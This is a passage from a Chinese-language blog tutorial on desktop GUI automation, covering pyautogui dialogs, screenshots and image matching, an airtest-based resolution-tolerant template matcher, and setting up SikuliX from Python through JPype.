class="string">&#x27;down&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, <span class="string">&#x27;enter&#x27;</span>, <span class="string">&#x27;esc&#x27;</span>, <span class="string">&#x27;escape&#x27;</span>, <span class="string">&#x27;execute&#x27;</span>, <span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;f10&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;f11&#x27;</span>, <span class="string">&#x27;f12&#x27;</span>, <span class="string">&#x27;f13&#x27;</span>, <span class="string">&#x27;f14&#x27;</span>, <span class="string">&#x27;f15&#x27;</span>, <span class="string">&#x27;f16&#x27;</span>, <span class="string">&#x27;f17&#x27;</span>, <span class="string">&#x27;f18&#x27;</span>, <span class="string">&#x27;f19&#x27;</span>, <span class="string">&#x27;f2&#x27;</span>, <span class="string">&#x27;f20&#x27;</span>, <span class="string">&#x27;f21&#x27;</span>, <span class="string">&#x27;f22&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;f23&#x27;</span>, <span class="string">&#x27;f24&#x27;</span>, <span class="string">&#x27;f3&#x27;</span>, <span class="string">&#x27;f4&#x27;</span>, <span class="string">&#x27;f5&#x27;</span>, <span class="string">&#x27;f6&#x27;</span>, <span class="string">&#x27;f7&#x27;</span>, <span class="string">&#x27;f8&#x27;</span>, <span class="string">&#x27;f9&#x27;</span>, <span class="string">&#x27;final&#x27;</span>, <span class="string">&#x27;fn&#x27;</span>, <span class="string">&#x27;hanguel&#x27;</span>, <span class="string">&#x27;hangul&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;hanja&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;junja&#x27;</span>, <span class="string">&#x27;kana&#x27;</span>, <span class="string">&#x27;kanji&#x27;</span>, <span class="string">&#x27;launchapp1&#x27;</span>, <span class="string">&#x27;launchapp2&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;launchmail&#x27;</span>, <span class="string">&#x27;launchmediaselect&#x27;</span>, <span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;modechange&#x27;</span>, <span class="string">&#x27;multiply&#x27;</span>, <span class="string">&#x27;nexttrack&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;nonconvert&#x27;</span>, <span class="string">&#x27;num0&#x27;</span>, <span class="string">&#x27;num1&#x27;</span>, <span class="string">&#x27;num2&#x27;</span>, <span class="string">&#x27;num3&#x27;</span>, <span class="string">&#x27;num4&#x27;</span>, <span class="string">&#x27;num5&#x27;</span>, <span class="string">&#x27;num6&#x27;</span>, <span class="string">&#x27;num7&#x27;</span>, <span class="string">&#x27;num8&#x27;</span>, <span class="string">&#x27;num9&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;numlock&#x27;</span>, <span class="string">&#x27;pagedown&#x27;</span>, <span class="string">&#x27;pageup&#x27;</span>, <span class="string">&#x27;pause&#x27;</span>, <span class="string">&#x27;pgdn&#x27;</span>, <span class="string">&#x27;pgup&#x27;</span>, <span class="string">&#x27;playpause&#x27;</span>, <span class="string">&#x27;prevtrack&#x27;</span>, <span class="string">&#x27;print&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;printscreen&#x27;</span>, <span class="string">&#x27;prntscrn&#x27;</span>, <span class="string">&#x27;prtsc&#x27;</span>, <span class="string">&#x27;prtscr&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;right&#x27;</span>, <span class="string">&#x27;scrolllock&#x27;</span>, <span class="string">&#x27;select&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;separator&#x27;</span>, <span class="string">&#x27;shift&#x27;</span>, <span class="string">&#x27;shiftleft&#x27;</span>, <span class="string">&#x27;shiftright&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;space&#x27;</span>, <span class="string">&#x27;stop&#x27;</span>, <span class="string">&#x27;subtract&#x27;</span>, <span class="string">&#x27;tab&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;up&#x27;</span>, <span class="string">&#x27;volumedown&#x27;</span>, <span class="string">&#x27;volumemute&#x27;</span>, <span class="string">&#x27;volumeup&#x27;</span>, <span class="string">&#x27;win&#x27;</span>, <span class="string">&#x27;winleft&#x27;</span>, <span class="string">&#x27;winright&#x27;</span>, <span class="string">&#x27;yen&#x27;</span>, <span class="string">&#x27;command&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;option&#x27;</span>, <span class="string">&#x27;optionleft&#x27;</span>, <span class="string">&#x27;optionright&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="弹窗操作"><a href="#弹窗操作" class="headerlink" title="弹窗操作"></a>弹窗操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 显示一个简单的带文字和OK按钮的消息弹窗。用户点击后返回button的文字。</span></span><br><span class="line">pyautogui.alert(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, button=<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">b = pyautogui.alert(text=<span class="string">&#x27;要开始程序么？&#x27;</span>, title=<span class="string">&#x27;请求框&#x27;</span>, button=<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b) <span class="comment"># 输出结果为OK</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 显示一个简单的带文字、OK和Cancel按钮的消息弹窗，用户点击后返回被点击button的文字，支持自定义数字、文字的列表。</span></span><br><span class="line">pyautogui.confirm(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, buttons=[<span class="string">&#x27;OK&#x27;</span>, <span class="string">&#x27;Cancel&#x27;</span>]) <span class="comment"># OK和Cancel按钮的消息弹窗</span></span><br><span class="line">pyautogui.confirm(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, buttons=<span class="built_in">range</span>(<span class="number">10</span>)) <span class="comment"># 10个按键0-9的消息弹窗</span></span><br><span class="line">a = pyautogui.confirm(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, buttons=<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># 输出结果为你选的数字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可以输入的消息弹窗，带OK和Cancel按钮。用户点击OK按钮返回输入的文字，点击Cancel按钮返回None。</span></span><br><span class="line">pyautogui.prompt(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 样式同prompt()，用于输入密码，消息用*表示。带OK和Cancel按钮。用户点击OK按钮返回输入的文字，点击Cancel按钮返回None。</span></span><br><span class="line">pyautogui.password(text=<span class="string">&#x27;&#x27;</span>, title=<span class="string">&#x27;&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, mask=<span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="图像操作"><a href="#图像操作" class="headerlink" title="图像操作"></a>图像操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui</span><br><span class="line">im = pyautogui.screenshot() <span class="comment"># 返回屏幕的截图，是一个Pillow的image对象</span></span><br><span class="line">im.save(<span class="string">&#x27;屏幕截图.png&#x27;</span>) <span class="comment">#保存图片</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">im = pyautogui.screenshot(<span class="string">&#x27;屏幕截图.png&#x27;</span>) <span class="comment"># 截全屏并设置保存图片的位置和名称</span></span><br><span class="line"><span class="built_in">print</span>(im) <span class="comment"># 打印图片的属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不截全屏，截取区域图片。截取区域region参数为：左上角XY坐标值、宽度和高度</span></span><br><span class="line">pyautogui.screenshot(<span class="string">&#x27;屏幕截图.png&#x27;</span>, region=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">300</span>, <span class="number">400</span>))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得文件图片在现在的屏幕上面的坐标，返回的是一个元组(top, left, width, height)</span></span><br><span class="line"><span class="comment"># 如果截图没找到，pyautogui.locateOnScreen()函数返回None</span></span><br><span class="line">a = pyautogui.locateOnScreen(<span class="string">r&#x27;目标图片路径&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># 打印结果为Box(left=0, top=0, width=300, height=400)</span></span><br><span class="line">x, y = pyautogui.center(a) <span class="comment"># 获得文件图片在现在的屏幕上面的中心坐标</span></span><br><span class="line"><span class="built_in">print</span>(x, y) <span class="comment"># 打印结果为150 200</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">x, y = pyautogui.locateCenterOnScreen(<span class="string">r&#x27;目标图片路径&#x27;</span>) <span class="comment"># 这步与上面的四行代码作用一样</span></span><br><span class="line"><span class="built_in">print</span>(x, y) <span class="comment"># 打印结果为150 200</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 匹配屏幕所有与目标图片的对象，可以用for循环和list()输出</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> pyautogui.locateAllOnScreen(<span class="string">r&#x27;C:\Users\ZDH\Desktop\PY\region_screenshot.png&#x27;</span>):</span><br><span class="line">  <span class="built_in">print</span>(pos)</span><br><span class="line"><span class="comment"># 打印结果为Box(left=0, top=0, width=300, height=400)</span></span><br><span class="line">a = <span class="built_in">list</span>(pyautogui.locateAllOnScreen(<span class="string">r&#x27;C:\Users\ZDH\Desktop\PY\region_screenshot.png&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a) <span class="comment"># 打印结果为[Box(left=0, top=0, width=300, height=400)]</span></span><br></pre></td></tr></table></figure>

<h3 id="分辨率适配"><a href="#分辨率适配" class="headerlink" title="分辨率适配"></a>分辨率适配</h3><p>注意:pyautogui的图像识别是模板匹配算法 无法跨分辨率识别(图片放大缩小就无法识别) 提供以下图像识别算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用需求:</span></span><br><span class="line"><span class="string">    需要安装 airtest  pip install  airtest  -i https://mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line"><span class="string">    运行时如果出现以下错误:  </span></span><br><span class="line"><span class="string">            import win32api</span></span><br><span class="line"><span class="string">        ImportError: DLL load failed: 找不到指定的程序。</span></span><br><span class="line"><span class="string">    重新安装win32api版本</span></span><br><span class="line"><span class="string">        pip install pywin32==227   # 安装 227版本</span></span><br><span class="line"><span class="string">        不行的话再试试</span></span><br><span class="line"><span class="string">        pip install pywin32==223  # 安装 223版本</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">from</span> airtest <span class="keyword">import</span> aircv</span><br><span class="line"><span class="keyword">from</span> airtest.aircv <span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> airtest.aircv.template_matching <span class="keyword">import</span> TemplateMatching</span><br><span class="line"><span class="keyword">from</span> airtest.core.cv <span class="keyword">import</span> MATCHING_METHODS, Predictor</span><br><span class="line"><span class="keyword">from</span> airtest.core.error <span class="keyword">import</span> InvalidMatchingMethodError</span><br><span class="line"><span class="keyword">from</span> airtest.core.helper <span class="keyword">import</span> logwrap, G</span><br><span class="line"><span class="keyword">from</span> airtest.core.win.screen <span class="keyword">import</span> screenshot</span><br><span class="line"><span class="keyword">from</span> airtest.utils.transform <span class="keyword">import</span> TargetPos</span><br><span class="line"><span class="keyword">from</span> six <span class="keyword">import</span> PY3</span><br><span class="line"><span class="keyword">from</span> airtest.core.settings <span class="keyword">import</span> Settings <span class="keyword">as</span> ST  <span class="comment"># noqa</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # -*- encoding=utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;airtest&quot;</span>)</span><br><span class="line">logger.setLevel(logging.ERROR)</span><br><span class="line"><span class="comment"># 日志级别有[DEBUG]、[INFO]、[WARNING] 和 [ERROR]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Template</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    picture as touch/swipe/wait/exists target and extra info for cv match</span></span><br><span class="line"><span class="string">    filename: pic filename</span></span><br><span class="line"><span class="string">    target_pos: ret which pos in the pic</span></span><br><span class="line"><span class="string">    record_pos: pos in screen when recording</span></span><br><span class="line"><span class="string">    resolution: screen resolution when recording</span></span><br><span class="line"><span class="string">    rgb: 识别结果是否使用rgb三通道进行校验.</span></span><br><span class="line"><span class="string">    scale_max: 多尺度模板匹配最大范围.</span></span><br><span class="line"><span class="string">    scale_step: 多尺度模板匹配搜索步长.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, filename, threshold=<span class="literal">None</span>, target_pos=TargetPos.MID, record_pos=<span class="literal">None</span>, resolution=(<span class="params"></span>), rgb=<span class="literal">False</span>, scale_max=<span class="number">800</span>, scale_step=<span class="number">0.005</span></span>):</span><br><span class="line">        self.filename = filename</span><br><span class="line">        <span class="comment"># self.filename =os.path.join(Settings.Picture_Path,filename)</span></span><br><span class="line">        self._filepath = <span class="literal">None</span></span><br><span class="line">        self.threshold = threshold <span class="keyword">or</span> ST.THRESHOLD</span><br><span class="line">        self.target_pos = target_pos</span><br><span class="line">        self.record_pos = record_pos</span><br><span class="line">        self.resolution = resolution</span><br><span class="line">        self.rgb = rgb</span><br><span class="line">        self.scale_max = scale_max</span><br><span class="line">        self.scale_step = scale_step</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">filepath</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.filename</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        filepath = self.filepath <span class="keyword">if</span> PY3 <span class="keyword">else</span> self.filepath.encode(sys.getfilesystemencoding())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Template(%s)&quot;</span> % filepath</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">match_in</span>(<span class="params">self, screen</span>):</span><br><span class="line">        match_result = self._cv_match(screen)</span><br><span class="line">        G.LOGGING.debug(<span class="string">&quot;match result: %s&quot;</span>, match_result)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> match_result:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        focus_pos = TargetPos().getXY(match_result, self.target_pos)</span><br><span class="line">        <span class="keyword">return</span> focus_pos</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">match_all_in</span>(<span class="params">self, screen</span>):</span><br><span class="line">        image = self._imread()</span><br><span class="line">        image = self._resize_image(image, screen, ST.RESIZE_METHOD)</span><br><span class="line">        <span class="keyword">return</span> self._find_all_template(image, screen)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @logwrap</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_cv_match</span>(<span class="params">self, screen</span>):</span><br><span class="line">        <span class="comment"># in case image file not exist in current directory:</span></span><br><span class="line">        ori_image = self._imread()</span><br><span class="line">        image = self._resize_image(ori_image, screen, ST.RESIZE_METHOD)</span><br><span class="line">        ret = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> ST.CVSTRATEGY:</span><br><span class="line">            <span class="comment"># get function definition and execute:</span></span><br><span class="line">            func = MATCHING_METHODS.get(method, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> InvalidMatchingMethodError(<span class="string">&quot;Undefined method in CVSTRATEGY: &#x27;%s&#x27;, try &#x27;kaze&#x27;/&#x27;brisk&#x27;/&#x27;akaze&#x27;/&#x27;orb&#x27;/&#x27;surf&#x27;/&#x27;sift&#x27;/&#x27;brief&#x27; instead.&quot;</span> % method)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> method <span class="keyword">in</span> [<span class="string">&quot;mstpl&quot;</span>, <span class="string">&quot;gmstpl&quot;</span>]:</span><br><span class="line">                    ret = self._try_match(func, ori_image, screen, threshold=self.threshold, rgb=self.rgb, record_pos=self.record_pos,</span><br><span class="line">                                            resolution=self.resolution, scale_max=self.scale_max, scale_step=self.scale_step)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ret = self._try_match(func, image, screen, threshold=self.threshold, rgb=self.rgb)</span><br><span class="line">            <span class="keyword">if</span> ret:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_try_match</span>(<span class="params">func, *args, **kwargs</span>):</span><br><span class="line">        G.LOGGING.debug(<span class="string">&quot;try match with %s&quot;</span> % func.__name__)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ret = func(*args, **kwargs).find_best_result()</span><br><span class="line">        <span class="keyword">except</span> aircv.NoModuleError <span class="keyword">as</span> err:</span><br><span class="line">            G.LOGGING.warning(<span class="string">&quot;&#x27;surf&#x27;/&#x27;sift&#x27;/&#x27;brief&#x27; is in opencv-contrib module. You can use &#x27;tpl&#x27;/&#x27;kaze&#x27;/&#x27;brisk&#x27;/&#x27;akaze&#x27;/&#x27;orb&#x27; in CVSTRATEGY, or reinstall opencv with the contrib module.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> aircv.BaseError <span class="keyword">as</span> err:</span><br><span class="line">            G.LOGGING.debug(<span class="built_in">repr</span>(err))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_imread</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> aircv.imread(self.filepath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_all_template</span>(<span class="params">self, image, screen</span>):</span><br><span class="line">        <span class="keyword">return</span> TemplateMatching(image, screen, threshold=self.threshold, rgb=self.rgb).find_all_results()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_keypoint_result_in_predict_area</span>(<span class="params">self, func, image, screen</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.record_pos:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># calc predict area in screen</span></span><br><span class="line">        image_wh, screen_resolution = aircv.get_resolution(image), aircv.get_resolution(screen)</span><br><span class="line">        xmin, ymin, xmax, ymax = Predictor.get_predict_area(self.record_pos, image_wh, self.resolution, screen_resolution)</span><br><span class="line">        <span class="comment"># crop predict image from screen</span></span><br><span class="line">        predict_area = aircv.crop_image(screen, (xmin, ymin, xmax, ymax))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> predict_area.<span class="built_in">any</span>():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># keypoint matching in predicted area:</span></span><br><span class="line">        ret_in_area = func(image, predict_area, threshold=self.threshold, rgb=self.rgb)</span><br><span class="line">        <span class="comment"># calc cv ret if found</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ret_in_area:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        ret = deepcopy(ret_in_area)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;rectangle&quot;</span> <span class="keyword">in</span> ret:</span><br><span class="line">            <span class="keyword">for</span> idx, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(ret[<span class="string">&quot;rectangle&quot;</span>]):</span><br><span class="line">                ret[<span class="string">&quot;rectangle&quot;</span>][idx] = (item[<span class="number">0</span>] + xmin, item[<span class="number">1</span>] + ymin)</span><br><span class="line">        ret[<span class="string">&quot;result&quot;</span>] = (ret_in_area[<span class="string">&quot;result&quot;</span>][<span class="number">0</span>] + xmin, ret_in_area[<span class="string">&quot;result&quot;</span>][<span class="number">1</span>] + ymin)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_resize_image</span>(<span class="params">self, image, screen, resize_method</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;模板匹配中，将输入的截图适配成 等待模板匹配的截图.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 未记录录制分辨率，跳过</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.resolution:</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        screen_resolution = aircv.get_resolution(screen)</span><br><span class="line">        <span class="comment"># 如果分辨率一致，则不需要进行im_search的适配:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">tuple</span>(self.resolution) == <span class="built_in">tuple</span>(screen_resolution) <span class="keyword">or</span> resize_method <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(resize_method, types.MethodType):</span><br><span class="line">            resize_method = resize_method.__func__</span><br><span class="line">        <span class="comment"># 分辨率不一致则进行适配，默认使用cocos_min_strategy:</span></span><br><span class="line">        h, w = image.shape[:<span class="number">2</span>]</span><br><span class="line">        w_re, h_re = resize_method(w, h, self.resolution, screen_resolution)</span><br><span class="line">        <span class="comment"># 确保w_re和h_re &gt; 0, 至少有1个像素:</span></span><br><span class="line">        w_re, h_re = <span class="built_in">max</span>(<span class="number">1</span>, w_re), <span class="built_in">max</span>(<span class="number">1</span>, h_re)</span><br><span class="line">        <span class="comment"># 调试代码: 输出调试信息.</span></span><br><span class="line">        G.LOGGING.debug(<span class="string">&quot;resize: (%s, %s)-&gt;(%s, %s), resolution: %s=&gt;%s&quot;</span> % (</span><br><span class="line">                        w, h, w_re, h_re, self.resolution, screen_resolution))</span><br><span class="line">        <span class="comment"># 进行图片缩放:</span></span><br><span class="line">        image = cv2.resize(image, (w_re, h_re))</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用法:</span></span><br><span class="line"><span class="string">    res = Template(目标图片路径,threshold=匹配阈值,target_pos=可以是123456789 分别对应图片的九个点).match_in(screenshot(None))</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    res = Template(<span class="string">&quot;pppp.png&quot;</span>,threshold=<span class="number">0.8</span>,target_pos=<span class="number">5</span>).match_in(screenshot(<span class="literal">None</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h3 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h3><ul>
<li>安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install PyAutoGUI</span><br></pre></td></tr></table></figure>

<ul>
<li>测试代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import pyautogui</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 打开记事本</span><br><span class="line">os.popen(&quot;notepad.exe&quot;)</span><br><span class="line">time.sleep(2)</span><br><span class="line"># 查找图片</span><br><span class="line">coords = pyautogui.locateOnScreen(&#x27;1.png&#x27;)</span><br><span class="line"># 得到图片的中心坐标</span><br><span class="line">pos = pyautogui.center(coords)</span><br><span class="line"># 移动鼠标</span><br><span class="line">pyautogui.moveTo(pos, duration=0.5)</span><br><span class="line"># 点击</span><br><span class="line">pyautogui.click()</span><br><span class="line"># 输入内容</span><br><span class="line">pyautogui.typewrite(&#x27;I like Python.&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查找的1.png图片如下</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20221008161852609.png" alt="image-20221008161852609"></p>
<ul>
<li>测试结果</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20221008161814486.png" alt="image-20221008161814486"></p>
<h2 id="sikulix"><a href="#sikulix" class="headerlink" title="sikulix"></a>sikulix</h2><ul>
<li><p>基于图像识别的开源工具，支持:</p>
<ul>
<li><p><strong>Windows</strong> XP, 7, 8 and 10 (development on Windows 10)</p>
</li>
<li><p><strong>Mac OSX</strong> 10.10 and later (development on macOS 10.15)</p>
</li>
<li><p><strong>Linux&#x2F;Unix</strong> systems depending on the availability of the prerequisites</p>
</li>
</ul>
</li>
<li><p><strong>有自己的IDE</strong></p>
</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>java的环境</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;java --version</span><br><span class="line">java 17.0.2 2022-01-18 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 17.0.2+8-LTS-86)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 17.0.2+8-LTS-86, mixed mode, sharing)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>打开<a href="https://raiman.github.io/SikuliX1/downloads.html">官网地址</a>下载sikuli的jar包，现在最新版本为<code>sikulixide-2.0.5-win.jar</code></p>
</li>
<li><p>运行jar，打开ide</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar d:\sikulixide-2.0.5-win.jar</span><br><span class="line"></span><br><span class="line">java -jar d:\sikulixide-2.0.5-win.jar -v -c</span><br></pre></td></tr></table></figure>

<h3 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h3><ul>
<li>打开ide后，写入测试的代码，运行正常，发现一个问题左侧并没有显示常用的api(包括使用快捷键ctrl+t都无反应)</li>
</ul>
<p><img src="/aposts/5639d3cc/image-20221008184205087.png" alt="image-20221008184205087"></p>
<ul>
<li>更多参考<a href="https://testerhome.com/topics/17225">这里</a>和官网<a href="https://sikulix-2014.readthedocs.io/en/latest/index.html">api</a></li>
</ul>
<h3 id="基于python使用sikuli图像识别"><a href="#基于python使用sikuli图像识别" class="headerlink" title="基于python使用sikuli图像识别"></a>基于python使用sikuli图像识别</h3><ul>
<li>由于Python不能直接调用Java的方法，需要借助一些第三方的库比如Jython、Jpype、Pyjnius等</li>
<li>安装依赖包</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;pip install JPype1</span><br><span class="line">Collecting JPype1</span><br><span class="line">  Downloading JPype1-1.4.0-cp37-cp37m-win_amd64.whl (343 kB)</span><br><span class="line">     ---------------------------------------- 343.9/343.9 kB 484.9 kB/s eta 0:00:00</span><br><span class="line">Requirement already satisfied: typing-extensions in d:\app\python37\lib\site-packages (from JPype1) (3.7.4.3)</span><br><span class="line">Installing collected packages: JPype1</span><br><span class="line">Successfully installed JPype1-1.4.0</span><br></pre></td></tr></table></figure>

<ul>
<li>测试代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> jpype <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jpype</span><br><span class="line"><span class="comment"># 启动java虚拟机，调用sikulixide</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> jpype.isJVMStarted():</span><br><span class="line">    jpype.startJVM(jpype.getDefaultJVMPath(),<span class="string">&#x27;-ea&#x27;</span>,<span class="string">r&#x27;-Djava.class.path=D:\sikulixide-2.0.5-win.jar&#x27;</span>)</span><br><span class="line"><span class="comment"># 调用java的方法</span></span><br><span class="line">java.lang.System.out.println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="comment"># 获取对应的类，对应api:https://sikulix-2014.readthedocs.io/en/latest/appclass.html#App</span></span><br><span class="line">app =JClass(<span class="string">&#x27;org.sikuli.script.App&#x27;</span>)</span><br><span class="line">app.<span class="built_in">open</span>(<span class="string">r&quot;c:\windows\System32\notepad.exe&quot;</span>)</span><br><span class="line"><span class="comment"># 对应api https://sikulix-2014.readthedocs.io/en/latest/screen.html#Screen</span></span><br><span class="line">Screen = JClass(<span class="string">&#x27;org.sikuli.script.Screen&#x27;</span>)</span><br><span class="line">screen=Screen()</span><br><span class="line">time.sleep(<span 